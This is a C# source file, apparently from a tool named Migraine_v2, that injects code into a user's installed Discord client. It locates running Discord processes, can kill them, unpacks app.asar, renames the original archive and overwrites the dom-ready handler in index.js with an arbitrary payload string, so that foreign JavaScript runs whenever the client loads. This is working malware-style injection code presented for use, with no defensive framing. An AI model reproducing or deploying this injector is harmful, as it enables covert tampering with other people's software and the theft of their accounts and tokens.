using Migraine_v2.Client.Asar_Extraction;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace Migraine_v2.Client
{
    public class ClientInjector
    {
        public Injection Settings { get; set; }
        public ClientInjector(Injection properties, bool InjectOnCreation = false)
        {
            Settings = properties;

            if (InjectOnCreation)
            {
                Inject();
            }
        }
        public bool Inject()
        {
            try 
            {
                var Process = GetDiscordProcesses();
                var path = Path.Combine(Path.GetDirectoryName(GetProcessPath(Process.First().Id)), "resources");
                if (Settings.KillDiscord) Process.ForEach(x => x.Kill());
                ExtractAsar(Path.Combine(path, "app.asar"), Path.Combine(path, "app"));
                File.Move(Path.Combine(path, "app.asar"), Path.Combine(path, "original_app.asar"));
                string Index = Path.Combine(Path.Combine(path, "app"), "index.js");
                string Contents = File.ReadAllText(Index);
                Contents = Contents.Replace("mainWindow.webContents.on('dom-ready', function () {});", Settings.Payload);
                File.WriteAllText(Index, Contents);
                return true;
            }
            catch(Exception)
            {
                return false;
            }
        }
        private bool ExtractAsar(string input, string output)
        {
            AsarArchive archive = new AsarArchive(input);
            AsarExtractor extractor = new AsarExtractor();

            return extractor.ExtractAll(archive, output, false);
        }

        private List<Process> GetDiscordProcesses()
        {
            return Process.GetProcesses().Where(x => x.ProcessName.StartsWith("Discord") && !x.ProcessName.EndsWith("Helper")).ToList();
        }

        private string GetProcessPath(int id)
        {
            string result;
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select ExecutablePath from Win32_Process where ProcessId = " + id.ToString()))
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    result = (from ManagementObject mo in managementObjectCollection select mo["ExecutablePath"]).First<object>().ToString();
                }
            }
            return result;
        }

    }

    public class Injection
    {
        public bool KillDiscord { get; set; }
        public string Payload { get; set; }
        public bool ExecuteOnLoad { get; set; }
        public Injection(bool kill, string code, bool executeOnLoad)
        {
            KillDiscord = kill;
            Payload = code;
            ExecuteOnLoad = executeOnLoad;
        }
    }
}
